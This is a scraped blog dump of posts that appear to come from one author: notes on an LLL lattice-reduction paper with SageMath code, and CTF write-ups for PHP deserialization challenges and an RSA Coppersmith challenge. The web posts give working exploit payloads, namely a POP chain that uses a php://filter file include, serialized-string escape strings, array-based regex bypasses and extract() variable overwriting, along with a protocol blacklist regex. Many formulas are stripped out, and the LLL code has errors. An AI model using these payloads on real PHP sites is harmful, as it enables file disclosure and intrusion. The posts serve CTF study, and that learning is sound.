2.1 (Two dimensional reduced basis). A basis is said to be reduced if it satisfies following condition:with the is called the orthogonal projection coefficient. Theorem 2.1. Given a two dimensional lattice with basis rank 2, if is the length of the shortest vector in , thenTheorem 2.2 if a basis is reduced, then is the shortest vector. ​ About the Definition 2.1 and Theorem 2.1 , 2.2 , I think when we can say we find the shortest vector , the basis is said “already be reduced”. And it means that this basis satisfies the condition in the Definition 2.1.​ So, if , the basis can be reduced continued. The description of Gauss’s algorithm solved SVP in 2-dimensional. Start with basis , if . swap and . Compute If . let be the biggest integer that is smaller than , and let If , then swap and , and repeat step 2. Otherwise, output According the algorithm above, I write the following script with the Sagemath. 1234567891011def Gauss_2d_reduce(basis): (b1,b2) = (basis[0],basis[1]) if basis[0].norm() &lt; basis[1].norm() else (basis[1],basis[0]) while True: u = (b1[0]*b2[0] + b1[1]*b2[1]) / b1.norm()^2 if u &gt; 0.5: m = int(u) b2 = b2 - m*b1 if b1.norm() &gt; b2.norm(): b1,b2 = b2,b1 else: return([b1,b2]) The basis we found in Gauss algorithm is not exactly orthogonal, but it is the nearest basis we can get. Gram-Schmidt OrthogonalizationTo generalize the algorithm to n-dimensions, we need to find a way to construct n-dimensional orthogonal basis based on the given basis, which leads us to Gram-Schmidt Orthogonalization. Theorem 3.1 (Gram-Schmidt Orthogonalization method). Given a basis of a subspace of , we define$$b_1^ = b_1 \\\\b_2^=b_2 - u_{1,2}b_1, \\ \\ \\ \\ \\ \\ u_{1,2} = {b_2 \\cdot b_1^ \\over b_1^ \\cdot b_1^} \\\\\\vdots \\\\b_m^ = b_m - \\sum_{i&lt;m}u_{i,m}b_i \\ \\ \\ \\ \\ \\ u_{i,m} = {b_m \\cdot b_i^ \\over b_i^ \\cdot b_i^} \\\\$$Then, $ \\{b_1^,b_2^,\\cdots,b_m^\\} H_m$. Based on this Theorem, if we set , then we haveTherefore, we can write the above formula in matrix form, . where basis vectors are columns in and . Thus, we haveObviously, we can know that For better understanding the matrix , let’s write the matrix at length. but before write down the matrix, I want to translate the formula in the Theorem 3.1. $$(b_1,b_2,\\cdots,b_n) = (b_1^,b_2^,\\cdots,b_n^)$$I can’t understand! why $B = B^U$ ????? LLL Basis ReductionDefinition 4.1 (LLL reduced basis). Let be a basis for a n-dimensional Lattice , and be the orthogonal basis generated in Theorem 3.1, and we have . We say is a LLL reduced basis if it satisfies two conditions: (1) (2) For each Remark. The constant is chosen for the simplicity of the paper. Any constant between and 1 can guarantee that the algorithm terminates in polynomial time. Remark. The condition 2 emphasizes the ordering of the basis, like what we did in two dimensional case. Given a basis in n-dimension, to get a LLL reduced basis, the LLL algorithm works as below. -e7f3a7c1aa0d4556bc0474fc55d46791.jpg) Step 1: Computed the most orthogonal basis based on Gram-Schmidt orthogonalization. Step 2: Check the second condition. Because I don’t know how to choose the constant, I run the LLL Algorithm four times with different constants for one output. 1234567891011121314151617181920212223242526272829303132333435def LLL_Algorithm(Lattice,constant=1/4): n = len(Lattice[0]) quickSort(Lattice,0,n-1) while True: finish = True for i in range(1,n+1): for k in range(1,i): m = int((Lattice[i-1]*Lattice[k-1]) / (Lattice[k-1] * Lattice[k-1])) Lattice[i-1] = Lattice[i-1] - m * Lattice[k-1] for i in range(n-1): u = (Lattice[i+1]*Lattice[i]) / (Lattice[i] * Lattice[i]) if ((Lattice[i+1]+u*Lattice[i]).norm())^2 &lt; ((constant) * (Lattice[i].norm())^2): Lattice[i],Lattice[i+1] = Lattice[i+1],Lattice[i] finish = False break if finish: if contant == 1: return Lattice else: return LLL_Algorithm(Lattice,constant+(1/4))def partition(Lattice, low, high): i = (low - 1) pivot = Lattice[high].norm() for j in range(low, high): if Lattice[j].norm() &lt;= pivot: i = i + 1 Lattice[i], Lattice[j] = Lattice[j], Lattice[i] Lattice[i + 1], Lattice[high] = Lattice[high], Lattice[i + 1] return (i + 1) def quickSort(Lattice, low, high): if low &lt; high: pi = partition(Lattice, low, high) quickSort(Lattice, low, pi - 1) quickSort(Lattice, pi + 1, high) Claim 4.1. If is a n-dimensional LLL reduced basis of Lattice , then is the length of the shortest vector of . In this paper, the author proof the LLL algorithm terminates in polynomial time of in the next part. If you want to know how to proof that, you can read the original paper. Conclusion I think this paper make me understand the LLL Algorithm easily, but I want to know more detail about the LLL Algorithm. If I have time, I would like to see the original paper about LLL! -&gt; https://link.springer.com/content/pdf/10.1007/BF01457454.pdf","tags":[{"name":"Reading","slug":"Reading","permalink":"http://tearsjin.github.io/tags/Reading/"},{"name":"LLL","slug":"LLL","permalink":"http://tearsjin.github.io/tags/LLL/"}]},{"title":"Noting of [MRCTF2020]Ezpop","date":"2021-03-25T03:32:21.000Z","path":"2021/03/25/Noting-of-MRCTF2020-Ezpop/","text":"这个链子有够长的 概述主要考察: 反序列化魔术方法 文件包含伪协议 这两部分可以找反序列化笔记和文件包含笔记 代码审计代码不长直接贴出来 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php//flag is in flag.phpclass Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ $this-&gt;append($this-&gt;var); }}class Show{ public $source; public $str; public function __construct($file='index.php'){ $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\"; } public function __toString(){ return $this-&gt;str-&gt;source; } public function __wakeup(){ if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker\"; $this-&gt;source = \"index.php\"; } }}class Test{ public $p; public function __construct(){ $this-&gt;p = array(); } public function __get($key){ $function = $this-&gt;p; return $function(); }}if(isset($_GET['pop'])){ @unserialize($_GET['pop']);}else{ $a=new Show; highlight_file(__FILE__);} 开头提示给了flag在flag.php中, 所以要想办法读取他.大概看了一遍, 发现个Modifier.append()里面有个include(), 要想办法调用它. 而在同个类中定义了魔术方法__invoke()会调用append(). 要想调用__invoke(), 就要把对象当成是函数进行调用. 分析到这里先断开, 因为我们还不知道到底有啥办法开始函数链的调用. 代码里面只有一行@unserialize($_GET['pop']);, 要想在反序列化后进行更多操作, 估计是需要一个__wakeup()的, 而类Show是定义了__wakeup(), 而这个__wakeup()中只存在一个调用$this-&gt;source = \"index.php\";, 这是一个对字符串的操作, 可以马上想到__toString() 而类Show中同样有__toString(), 继续看下去, __toString()里依然只有一个调用return $this-&gt;str-&gt;source;这里可以调用一个变量, 要想到__get(), 刚好类Test中有__get(), 而这个__get()就提供了一个函数调用的入口. 到了这里我们就找到了一个调用链: @unserialize($_GET['pop']) -&gt; Show.__wakeup() -&gt; Show.__toString() -&gt; Test.__get() -&gt; Modifier.__invoke() -&gt; Modifier.appen() -&gt; include() payload构造我们跟着调用链一步一步构造即可, 这里还需要注意一下, 因为是要包含一个php文件, 直接包含会直接执行, 那么里面的变量就看不到了, 要用php:\\\\filter讲文件base64编码再包含进来. 12345678910111213141516171819&lt;?phpclass Show{ public $source; public $str = 'ftp';}class Modifier{ protected $var = 'php://filter/read=convert.base64-encode/resource=./flag.php';}class Test{ public $p;}$a = new Show;$b = new Show;$c = new Test;$d = new Modifier;$c-&gt;p = $d;$b-&gt;str = $c;$a-&gt;source = $b;echo urlencode(serialize($a)); 得到payload: 1O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D.%2Fflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3Bs%3A3%3A%22ftp%22%3B%7D exp直接传就完事了. 传完拿到文件后base64解码一下","tags":[{"name":"Web","slug":"Web","permalink":"http://tearsjin.github.io/tags/Web/"},{"name":"unserialize","slug":"unserialize","permalink":"http://tearsjin.github.io/tags/unserialize/"},{"name":"魔术方法","slug":"魔术方法","permalink":"http://tearsjin.github.io/tags/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"},{"name":"文件包含","slug":"文件包含","permalink":"http://tearsjin.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"伪协议","slug":"伪协议","permalink":"http://tearsjin.github.io/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"}]},{"title":"Noting of [安洵杯 2019]easy_serialize_php","date":"2021-03-24T15:59:59.000Z","path":"2021/03/24/Noting-of-安洵杯-2019-easy-serialize-php/","text":"又是一题字符逃逸, 不过还有其他要注意的点 概述这题考察的点有: 反序列化字符逃逸 extract()变量覆盖 代码审计提示说phpinfo()中有东西, 找了一下发现有auto_append_file: d0g3_f1ag.phpauto_append_file: 设置每个php中都自动require一个文件 中间有个extract($_POST), 可能存在变量覆盖 在代码的最后, 存在file_get_contents(base64_decode($userinfo['img']))看参数是否可控, 可以看到有两行$userinfo = unserialize($serialize_info)$serialize_info = filter(serialize($_SESSION)) 确认有序列化和反序列化, 而$serialize_info在序列化之后存在一个过滤使得字符减少 可能存在字符逃逸来细细看一下$_SESSION 12345$_SESSION = array( \"user\" =&gt; 'guest', \"function\" =&gt; @$_GET['f'], \"img\" =&gt; sha1(base64_encode($_GET['img_path'])),) 可以看到有两个参数是可以控制的, 但\"img\"会进行一次sha1加密, 反序列化后却不进行sha1解密, 所以无论输入什么基本都是无效的… 而\"function\"是可控, 且存在字符逃逸, 但如果要执行file_get_contents()​, 必须有$function='show_image', 在$function的值赋给$_SESSION之后, 存在一个$extract($_POST), 我们可以利用这个修改$function 为show_image 到这里思路就清楚了: file_get_contents(base64_decode($userinfo['img']))参数可控 -&gt; 利用字符逃逸从\"funtion\"控制\"img\" -&gt; 利用 extract()变量覆盖修改$function为show_image 反序列化字符逃逸总结了挺多次了… 这次的filter是字符减少的替换, 需要利用数组来进行逃逸, 具体原理不多讲了, 可以看反序列化那篇笔记 extract()变量覆盖这个还是第一次遇到,. extract()函数从数组中将变量导入到当前的符号表。 也就是说参数是个数组, 并且根据键对值来创造变量, 而且可以覆盖前面的变量, 这样就可以造成变量覆盖了 payload 构造 字符逃逸的构造也总结很多次了, 这次就简单的说一下 这题主要就是构造字符逃逸的payload, 我们需要最后\"img\" =&gt; base64encode(\"d0g3_f1ag.php\")老套路, 先构造一个 123456$_SESSION[\"user\"] = 'guest';$_SESSION['function'] = $_GET['f'];$_SESSION['img'] = base64_encode('guest_img.png');$a = serialize($_SESSION);echo $a;# a:3:{s:4:\"user\";s:5:\"guest\";s:8:\"function\";N;s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";} 再慢慢尝试通过字符减少把一个双引号闭合, 最后可以构造出payload: 1?f[]=phpphpphpphp&amp;f[]=\";i:1;s:1:\"1\";}s:3:\"img\";s:20:\"ZDBnM19mbGxsbGxsYWc= EXPGET方式传?f[]=phpphpphpphp&amp;f[]=\";i:1;s:1:\"1\";}s:3:\"img\";s:20:\"ZDBnM19mbGxsbGxsYWc=POST方式传function=show_image 不过结果发现flag并不在d0g3_f1ag.php中,d0g3_f1ag.php中只有一句 $flag = 'flag in /d0g3_fllllllag';那就再构造一次 ?f[]=phpphpphpphp&amp;f[]=\";i:1;s:1:\"1\";}s:3:\"img\";s:20:\"L2QwZzNfZmxsbGxsbGFn 别忘了POST, 然后就能看到flag了 后记做完题后翻了下别的师傅的wp, 发现别的师傅都是GET传f=show_image, POST直接对$_SESSION['user']和$_SESSION['function']做文章, 这样就不需要通过数组来进行字符逃逸了, 这也是一种思路, 而且可以控制的变量更多了(我脑子怎么就没转过来… 不过因为脑子没转过来也解锁了控制一个变量的时候, 利用数字来进行字符减少的字符逃逸!","tags":[{"name":"Web","slug":"Web","permalink":"http://tearsjin.github.io/tags/Web/"},{"name":"字符逃逸","slug":"字符逃逸","permalink":"http://tearsjin.github.io/tags/%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"},{"name":"unserialize","slug":"unserialize","permalink":"http://tearsjin.github.io/tags/unserialize/"},{"name":"变量覆盖","slug":"变量覆盖","permalink":"http://tearsjin.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"}]},{"title":"writeup for 2021 NepCTF(To be continued","date":"2021-03-24T07:59:39.000Z","path":"2021/03/24/writeup-for-2021-NepCTF/","text":"太菜了太菜了太菜了, 虽然说跑出去玩了两天, 但还是花了半天时间做的, 一道Coppersmith’s short-pad attack没有想到调, 做了半天都没出来, 属实拉了. 最后也就做了个改表的base64….算是除了签到就没出吧(还有道古典不想查了5555 0x00 Real_Baseproblem12345678910111213141516171819202122232425262728293031323334#py2import stringimport randomfrom secret import flag,b_chardef encode(s): res='' binstr=[ bin(ord(s[i])).replace('0b','').zfill(8) for i in range(len(s))] p1=len(binstr) // 3 p2=len(binstr) % 3 part1 = binstr[0:3*p1] for i in range(p1): str_p1=binstr[i*3]+binstr[i*3+1]+binstr[i*3+2] tmp_str = [str_p1[x: x + 6] for x in [0, 6, 12, 18]] tmp_res = [b_char[int(x,2)]for x in tmp_str] res+=''.join(tmp_res) if p2: part2 = binstr[3*p1:] str_p2 = ''.join(part2)+(3-p2)*'0'*8 tmp_str = [str_p2[x: x + 6] for x in [0, 6, 12, 18]][:p2+1] tmp_res = [b_char[int(x,2)]for x in tmp_str] res+=''.join(tmp_res) res +='='*(3-p2) return res m1=random.sample(list(b_char),50)print ''.join(m1)print encode(m1)print encode(flag)# rTcb1BR8YVW2EOUjweXpIiLt5QCNg7ZAsD9muq3ylMhvofnx/P# 2Br9y9fcu97zvB2OruZv0D3Bwhbj0uNQnvfdtC2TwAfPrdBJ3xeP4wNn0hzLzCVUlRa=# tCvM4R3TzvZ7nhjBxSiNyxmP28e7qCjVxQn91SRM3gBKzxQ= 看了一下整个过程, 就是个base64, 但是表未知, 直接通过一对明文和密文回推表, 得出部分表基本上就能猜出整个表了, 直接用改过的表解码就行了. exp 当时做的时候的脚本不见了5555555 0x01 你们一天天的不写代码, 难道是在等待爱情古典大混合, 什么银河字母, 古精灵…..不找了 0x02 ChildRSAproblem12345678910111213141516171819202122232425262728293031323334353637383940414243#childrsa.pyfrom Crypto.Util.number import *from gmpy2 import irootfrom os import *from secret import flag1,flag2,padding1,padding2assert len(flag1)==20assert len(flag1)&gt;len(flag2)assert len(flag2)==len(padding2)def init1(): m=(padding1*2**200+bytes_to_long(flag1))*2**200 r1=getPrime(170) r2=getPrime(170) p=getPrime(1024) q=getPrime(1024) N=p*q return m,r1,r2,N def enc1(m,r1,r2,N): c1=pow(m+r1,3,N) c2=pow(m+r2,3,N) return c1,c2def init2(): prefix = 2**1000 r3 = prefix+flag2*2**200 r4 = 2*prefix+padding2*2**200 return r3,r4def enc2(r3,r4): c3 = pow(r3*r4,3) return c3(m,r1,r2,N) = init1()(c1,c2)=enc1(m,r1,r2,N)(r3,r4) = init2()c3 = enc2(r3,r4)print Nprint(c1,c2,c3)# output.txtN= ...(c1,c2,c3)= ... 就是这道题做了半天都没出来, 当时试了好久的Coppersmith’s short-pad attack(后面简写为Csp atk, 连都从0.01遍历到1了, 依旧没有出结果, 看了官方wp, WTF??? 调成1???, 为什么? 抱着这个问题我又重新翻了一下Sagemath文档, 找到了small_roots()的解释: sage.rings.polynomial.polynomial_modn_dense_ntl.small_roots(self, X=None, beta=1.0, epsilon=None, \\*kwds*) ​ Let be the characteristic of the base ring this polynomial is defined over: N = self.base_ring().characteristic(). This method returns small roots of this polynomial modulo some factor of with the constraint that . Small in this context means that if is a root of modulo then . This is either provided by the user or the maximum is chosen such that this algorithm terminates in polynomial time. If is chosen automatically it is . The algorithm may also return some roots which are larger than X. This algorithm in this context means Coppersmith’s algorithm for finding small roots using the LLL algorithm. The implementation of this algorithm follows Alexander May’s PhD thesis referenced below. INPUT: X – an absolute bound for the root (default: see above) beta – compute a root mod where is a factor of N and ( Default: 1.0, so . ) epsilon – the parameter described above. (Default: ) **kwds – passed through to method Matrix_integer_dense.LLL(). REFERENCES: Don Coppersmith. Finding a small root of a univariate modular equation. In Advances in Cryptology, EuroCrypt 1996, volume 1070 of Lecture Notes in Computer Science, p. 155–165. Springer, 1996. http://cr.yp.to/bib/2001/coppersmith.pdf Alexander May. New RSA Vulnerabilities Using Lattice Reduction Methods. PhD thesis, University of Paderborn, 2003. http://www.cs.uni-paderborn.de/uploads/tx_sibibtex/bp.pdf 文档里面给出了small_roots()使用的算法的paper, 有时间好好看一下.这个函数需要注意的有三个参数X,beta,epsilon, 其中beta和epsilon也就是和 . 来看看这三个参数都该怎么填 : 这个算是最好填的, 可以理解成smallroot的上界, 一般来说题目中给出了要解的小根的位数kbits就设置. 而在Csp atk中, 理论可解上界是 : 这个可以理解成的因子的下界, 对于常规RSA中的, 一般就只有四个因子, 我们可以选取作为算法使用的因子, 所以其实可以从0取到1, 因为都可能成立, 但真正用的时候一般取. : 神奇的参数, 不填就是, 文档中给出了一个关系式, 其实这个可以暂时忽略掉, 所以就有, 文档里并没有给出 到底该如何取, 但从这题的官方wp中是给出了, 其实就是多项式的次数. 所以对于Csp atk来说, , 的取法为 所以说,填1也是阔以的! 因为factor里面是有的! 按着上面的分析, 把从La佬那边拿来的Csp atk的板子稍微修改一下( 以后就用改进过的板子了嘿嘿嘿…. exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647def short_pad_attack(c1, c2, e, n , kbits = 0): if kbits == 0 : kbits = n.nbits()//(e*e) PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n)) PRx.&lt;xn&gt; = PolynomialRing(Zmod(n)) PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() x = ceil(n.nbits() // kbits) for b in [0.4,0.5,0.6,1]: eps = (b^2) / (e^2) - (1/x) print(eps) if eps &lt;= 0: eps = b / 8 print('[+] try beta={} epsilon={}'.format(float(b),float(eps))) diff = h.small_roots(X=2^kbits, beta=b,epsilon=eps) if len(diff) &gt; 0 : print('[+] find diff with beta={} and epsilon={}'.format(b,eps)) return diff print('[-] can not find the diff') return diff def related_message_attack(c1, c2, diff, e, n): PRx.&lt;x&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]from Crypto.Util.number import long_to_bytes as l2bn = ...(c1,c2,c3)= ...e= 3diff = short_pad_attack(c1,c2,e,n,kbits=170)[0]res = related_message_attack(c1,c2,diff,e,n)l2b(res)# b'\\xd4!I\\x80M\\xf0\\x80\\\\\\xd9&gt;\\x19\\xad\\xdd^\\x1d$\\x99\\xc1V\\xc9/+\\xdc\\x97\"\\xb3 \\x03\\xef3\\xd1\\xea\\x04\\xf4\\x81z$\\xd2]{\\xcb\\xc4\\x93\\xe7\\xf6\\xb7\\x9a\\xb2\\xe6a\\x9fl\\x99\\xady\\xa8\\x9e\\xa2\\xf5\\'\\xa2\\xfc\\xe0Z\\xa1\\x1c\\x15\\rQ\\x7fM\\x99T\\x93\\x04\\xc5\\xdd\\xdc\\x80\\xe4\\x0f\\x85)\\x9f\\xc3p\\xdc\\x03j.\\x87kU\\'Ud\\x0bD\")\\x00\\x00\\x00\\x00\\x00Nep{Nep_n3p_ba4_bad_\\x00\\x00\\x00\\x03\\tx@Q2\\x1b3\\x1f\\r\\xb2\\x95\\x86?kE\\x1f\\xe6\\xaay\\xf1\\xe5' 可以看到flag已经出来一部分了Nep{Nep_n3p_ba4_bad_ 来看看怎么求flag2, 先把给的条件写出来, 我们记官方wp上面说想考一下二元的Coopersmith, 先放着, 有空了学习一波. 这题还可以直接解一元二次方程直接出 解方程解法我们可以直接通过开三次方得出咱们先联立一下的两个式子这里要注意一下, , 也就是说所以其实咱们可以直接有这样我们就能求出了, 然后我们直接式两边同时乘, 把带入, 就可以构造出一个关于的一元二次方程了.解出发现…是假flag, md我算了那么久居然是个假的??? 突然想到会不会padding2才是真正的flag, 又把padding2算出来了, 果然….padding2才是真flag exp12345678c = int(c3.nth_root(3) % (2^2001))pdf = int(c %2^1200 // 2^400)x = var('x')f = 2^1200 * pdf - c * x + 2^1201 * x^2 + 2^400 * x * pdfflag2 = int(f.roots()[0][0])padding = pdf // flag2l2b(padding)# b'1_l0v3_9ou}' 所以最后的flag就是Nep{Nep_n3p_ba4_bad_1_l0v3_9ou} 0x03 easyEncryption 暂时还没时间, 有空看看 0x04 lowExponent 暂时还没时间, 有空看看","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"}]},{"title":"Noting of [0CTF 2016]piapiapia","date":"2021-03-23T12:26:47.000Z","path":"2021/03/23/Noting-of-0CTF-2016-piapiapia/","text":"这题算是第一次做比较长的web题, 收获很多, 好好记录一下 概述这道题主要的考察点有: 源码泄露 数组绕过正则匹配和strlen() 反序列化字符逃逸 源码泄露就一个登录页面, 随便输入尝试弱密码登录无果.测试是否存在sql, 也没什么收获随手一试www.zip, 可以下载 存在源码泄露 源码主要有这几个文件: update.php register.php profile.php index.php config.php class.php 代码审计反序列化字符逃逸做ctf肯定要找flag, config.php中就有$flag, 所以要想办法读取config.php.大概浏览了一下, 在profile.php中发现了这么一行 $photo = base64_encode(file_get_contents($profile['photo'])); 再往上找找看这个函数中的参数是否可控, 下面是往上找的过程: 12345678910111213141516171819202122232425262728// profile.php$profile = unserialize($profile); // 可能存在反序列化漏洞, 也可以知道这里的$profile是个序列化串, 继续往前$phone = $profile['phone'];$email = $profile['email'];$nickname = $profile['nickname'];$photo = base64_encode(file_get_contents($profile['photo']));$profile=$user-&gt;show_profile($username); // $profile 是调用$user-&gt;show_profile()得到的// class.phppublic function show_profile($username) { // profile是从数据库读出来的, 并且没有处理, 所以数据库中就是序列化字符串 $username = parent::filter($username); $where = \"username = '$username'\"; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile; }public function update_profile($username, $new_profile) { // profile上传时会经过一次过滤 $username = parent::filter($username); $new_profile = parent::filter($new_profile); // 这个过滤器会替换字符, 可以使得字符长度变长 $where = \"username = '$username'\"; return parent::update($this-&gt;table, 'profile', $new_profile, $where); } 看到这里大概就有思路了, $profile是上传至数据库后重新读取下来的, 而且上传之前会对序列化串进行一次替换, 替换存在字符数量增加, 也就意味着可以字符逃逸, 如果有字符逃逸, 那么完全可以伪造一个假的$profile['photo']='config.php', 然后读取flag 再继续往前看 123456789101112131415161718192021222324// register.php 提供了注册的入口, 注册完就能随便登录了, 登录后就能上传profile// update.php$username = $_SESSION['username'];if(!preg_match('/^\\d{11}$/', $_POST['phone'])) die('Invalid phone');if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email'])) die('Invalid email');if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname');$file = $_FILES['photo'];if($file['size'] &lt; 5 or $file['size'] &gt; 1000000) die('Photo size error');move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));$profile['phone'] = $_POST['phone'];$profile['email'] = $_POST['email'];$profile['nickname'] = $_POST['nickname'];$profile['photo'] = 'upload/' . md5($file['name']);$user-&gt;update_profile($username, serialize($profile)); 可以看到我们可以控制的有很多参数phone, email, nickname都可以, 但是如果要进行字符逃逸, 必然会被前面的正则发现导致上传失败, 所以要想办法绕过 数组绕过php中的数组是一个很神奇的东西, 他会有下面这些特性 md5(Array()) = null sha1(Array()) = null ereg(pattern,Array()) =null preg_match(pattern,Array()) = false strcmp(Array(), “abc”) =null strpos(Array(),“abc”) = null strlen(Array()) = null 5.3以下版本无报错, 5.3及以上版本会出现E_NOTICE级别错误, 下面有关于错误等级的一些知识 我们可以看到, 如果参数是数组, 那么preg_match()和strlen()都会返回NULL,并且出现E_NOTICE错误, 这个错误是不影响程序继续运行的. 所以, 我们只要传参nickname[]=xxxxxx, 就可以绕过这个正则, 任意控制参数$_POST['nickname']了 12if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); PHP 错误等级E_NOTICE 表示一般情形不记录，只有程式有错误情形时才用到，例如企图存取一个不存在的变数，或是呼叫 stat() 函式检视不存在的档案。E_WARNING 通常都会显示出来，但不会中断程式的执行。这对除错很有效。例如：用有问题的常规表示法呼叫 ereg()。E_ERROR 通常会显示出来，亦会中断程式执行。意即用这个遮罩无法追查到记忆体配置或其它的错误。E_PARSE 从语法中剖析错误。E_CORE_ERROR 类似 E_ERROR，但不包括 PHP核心造成的错误。E_CORE_WARNING 类似 E_WARNING，但不包括 PHP 核心错误警告。 所以整个流程就是 通过绕过正则任意上传nickename -&gt; 替换serialize_string中的字符改变字符长度造成字符逃逸 -&gt; 利用file_get_contents()读取config.php payload构造那么要怎么构造nickname[]来进行字符逃逸呢, 先来看看这个序列化字符串大概是怎样的 1234567$profile['phone'] = '11111111111';$profile['email'] = '11111111@qq.com';$profile['nickname'] = $_GET['nickname'];$profile['photo'] = 'upload/' . md5($file['name']);echo serialize($profile);# ?nickname[]=# a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:15:\"11111111@qq.com\";s:8:\"nickname\";a:1:{i:0;s:0:\"\";}s:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";} 如果我们想最后反序列化出来的photo =&gt; config.php,那么传上去的nickname最后一段应该是这个\";}s:5:\"photo\";s:10:\"config.php\";}, 这段字符一共34个, 再看一下替换的函数 123$safe = array('select', 'insert', 'update', 'delete', 'where');$safe = '/' . implode('|', $safe) . '/i'; # 过滤'select', 'insert', 'update', 'delete', 'where' 替换成hackerreturn preg_replace($safe, 'hacker', $string); 可以看到, 序列化后的字符串serialize_string中存在where时会被替换成hacker, 那么字符串长度就会+1所以nickname中需要34个where就能把后面的字符挤出去实现逃逸, 可以看一下具体效果 12345678910111213# ?nickname[]=#wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}$profile['phone'] = '11111111111';$profile['email'] = '11111111@qq.com';$profile['nickname'] = $_GET['nickname'];$profile['photo'] = 'upload/' . md5($file['name']);echo serialize($profile);# a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:15:\"11111111@qq.com\";s:8:\"nickname\";a:1:{i:0;s:204:\"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}\";}s:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";}echo filter(serialize($profile));# a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:15:\"11111111@qq.com\";s:8:\"nickname\";a:1:{i:0;s:204:\"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\";}s:5:\"photo\";s:10:\"config.php\";}\";}s:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";} 等到反序列化的时候, 就只会反序列化前面一部分了 1a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:15:\"11111111@qq.com\";s:8:\"nickname\";a:1:{i:0;s:204:\"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\";}s:5:\"photo\";s:10:\"config.php\";} 结果就会是: 12345array(4) { [\"phone\"]=&gt; string(11) \"11111111111\" [\"email\"]=&gt; string(15) \"11111111@qq.com\" [\"nickname\"]=&gt; array(1) { [0]=&gt; string(204) \"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\" } [\"photo\"]=&gt; string(10) \"config.php\" } 成功了! EXP先随便注册一个用户并登录，在profile上传的时候先随便填写数据，再抓包，将nickname改成nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";} 上传完后访问profile.php, 查看图片的地址，最后把base64转成文本就有flag了","tags":[{"name":"Web","slug":"Web","permalink":"http://tearsjin.github.io/tags/Web/"},{"name":"源码泄露","slug":"源码泄露","permalink":"http://tearsjin.github.io/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"name":"unsrialize","slug":"unsrialize","permalink":"http://tearsjin.github.io/tags/unsrialize/"},{"name":"字符逃逸","slug":"字符逃逸","permalink":"http://tearsjin.github.io/tags/%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"},{"name":"正则绕过","slug":"正则绕过","permalink":"http://tearsjin.github.io/tags/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/"}]},{"title":"The learning of php 